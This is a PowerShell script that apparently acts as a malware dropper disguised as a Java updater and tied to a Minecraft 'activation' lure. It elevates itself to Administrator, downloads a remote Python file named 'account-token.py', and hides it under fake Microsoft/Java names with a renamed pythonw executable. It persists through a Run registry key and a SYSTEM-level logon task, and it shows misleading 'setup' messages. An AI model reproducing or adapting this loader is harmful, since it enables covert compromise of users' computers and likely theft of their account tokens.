if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    exit
}


$GITHUB_RAW_URL = "https://raw.githubusercontent.com/get-activated/com.mojang.minecraft/refs/heads/main/account-token.py"
$InstallDir = "$env:APPDATA\Microsoft\JavaUpdater"
$AgentPath = "$InstallDir\win_sys_host.pyw"
$PythonPath = "$InstallDir\bin"

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
}


$pythonInstalled = $false
try {
    $pythonVersion = & python --version 2>&1
    if ($pythonVersion -match "Python 3") {
        $pythonInstalled = $true
        $pythonwExe = "pythonw"
    }
} catch {}

if (-not $pythonInstalled) {
    Write-Host "Configuring environment..." -ForegroundColor Yellow
    $pythonUrl = "https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip"
    $pythonZip = "$env:TEMP\sys_cache.zip"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonZip -UseBasicParsing
    Expand-Archive -Path $pythonZip -DestinationPath $PythonPath -Force
    Remove-Item $pythonZip
    

    if (Test-Path "$PythonPath\pythonw.exe") { 
        Rename-Item "$PythonPath\pythonw.exe" "JavaUpdaterHost.exe" -Force 
    }
    $pythonwExe = "$PythonPath\JavaUpdaterHost.exe"
}


Invoke-WebRequest -Uri $GITHUB_RAW_URL -OutFile $AgentPath -UseBasicParsing


$q = [char]34

$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$RunCommand = "$q$pythonwExe$q $q$AgentPath$q"
Set-ItemProperty -Path $RegPath -Name "JavaUpdateManager" -Value $RunCommand -Force


$Action = New-ScheduledTaskAction -Execute $pythonwExe -Argument "$q$AgentPath$q"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "JavaUpdateCheck" -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null


Start-Process $pythonwExe -ArgumentList "$q$AgentPath$q"

Write-Host "Setup complete." -ForegroundColor Green
exit
